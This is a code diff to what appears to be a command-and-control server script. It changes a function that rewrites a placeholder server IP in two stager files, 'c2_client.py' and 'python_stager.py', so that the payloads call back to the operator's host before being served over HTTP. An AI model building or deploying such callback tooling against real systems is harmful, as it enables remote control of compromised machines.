@@ -73,38 +73,43 @@ def start_listener():
         client_handler.start()
 
 def update_client_file():
-    payload_path = os.path.join(os.path.dirname(__file__), 'Stagers', PAYLOAD_FILENAME)
-    print(f"[*] Updating file at: {payload_path}")  # Debugging line
-    
-    if not os.path.isfile(payload_path):
-        print(f"[!] Payload file not found: {payload_path}")
-        return
+    files_to_update = [
+        os.path.join(os.path.dirname(__file__), 'Stagers', 'c2_client.py'),
+        os.path.join(os.path.dirname(__file__), 'Stagers', 'python_stager.py')
+    ]
 
-    try:
-        with open(payload_path, 'r') as file:
-            content = file.read()
-    except Exception as e:
-        print(f"[!] Error reading file: {e}")
-        return
-
-    # Ensure that the search string exists in the content before replacing
     search_string = "SERVER_HOST = '1.1.1.1'"
-    if search_string not in content:
-        print(f"[!] Search string not found in the file.")
-        return
+    
+    for file_path in files_to_update:
+        print(f"[*] Updating file at: {file_path}")
 
-    updated_content = content.replace(
-        search_string, f"SERVER_HOST = '{HOST}'"
-    )
+        if not os.path.isfile(file_path):
+            print(f"[!] Payload file not found: {file_path}")
+            continue
 
-    try:
-        with open(payload_path, 'w') as file:
-            file.write(updated_content)
-    except Exception as e:
-        print(f"[!] Error writing to file: {e}")
-        return
+        try:
+            with open(file_path, 'r') as file:
+                content = file.read()
+        except Exception as e:
+            print(f"[!] Error reading file {file_path}: {e}")
+            continue
 
-    print(f"[*] Updated {PAYLOAD_FILENAME} with server IP: {HOST}")
+        if search_string not in content:
+            print(f"[!] Search string not found in the file {file_path}.")
+            continue
+
+        updated_content = content.replace(
+            search_string, f"SERVER_HOST = '{HOST}'"
+        )
+
+        try:
+            with open(file_path, 'w') as file:
+                file.write(updated_content)
+        except Exception as e:
+            print(f"[!] Error writing to file {file_path}: {e}")
+            continue
+
+        print(f"[*] Updated {file_path} with server IP: {HOST}")
 
 def start_http_server():
     update_client_file()  # Update the client file before serving
